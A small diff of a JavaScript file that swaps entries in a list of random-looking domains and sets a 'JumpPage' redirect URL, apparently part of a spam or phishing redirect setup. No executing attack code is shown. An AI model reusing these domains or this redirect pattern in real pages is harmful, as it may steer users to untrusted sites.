@@ -37,9 +37,9 @@ var emails = [
 ];
 
 var urls=[];
-        urls.push(".vpbdchofk.cc");   
-        urls.push(".slnfvvwp.cc");  
-        urls.push(".iuudsmodz.cc");    
+        urls.push(".zb14x93m.com");   
+        urls.push(".vpbdchofk.cc");  
+        urls.push(".slnfvvwp.cc");    
         
                      	
 var JumpPage="https://xlgv85.com";
